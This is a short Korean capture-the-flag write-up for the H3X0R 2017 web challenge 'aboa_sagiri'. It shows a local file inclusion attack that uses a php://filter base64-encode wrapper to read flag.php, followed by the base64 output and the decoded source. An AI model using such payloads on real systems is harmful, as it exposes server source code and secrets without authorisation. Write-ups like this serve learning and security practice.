======================================================
[2017_H3X0R] [WEB] aboa_sagiri
======================================================

문제 내용
======================================================

http://garbage.dothome.co.kr/chall.php


문제 풀이
======================================================

해당 사이트에 접속해보면 친절하게 LFI라고 말해주고 있다. LFI를 통해 flag.php를 읽어보자.

.. code-block:: html

    http://garbage.dothome.co.kr/chall.php?file=php://filter/convert.base64-encode/resource=flag.php
    PD9waHAKICAgIGVjaG8gIlVzZSBMRkkhIjsKICAgICRmbGFnID0gIkgzWDBSe2EwYmFfYzB0ZV9hZG0xdD99IjsK

base64 코드를 확인할 수 있고, 해당 코드를 디코드하면 플래그를 획득할 수 있다.

.. code-block:: console

    $ echo "PD9waHAKICAgIGVjaG8gIlVzZSBMRkkhIjsKICAgICRmbGFnID0gIkgzWDBSe2EwYmFfYzB0ZV9hZG0xdD99IjsK"|base64 -D
    <?php
        echo "Use LFI!";
        $flag = "H3X0R{a0ba_c0te_adm1t?}";
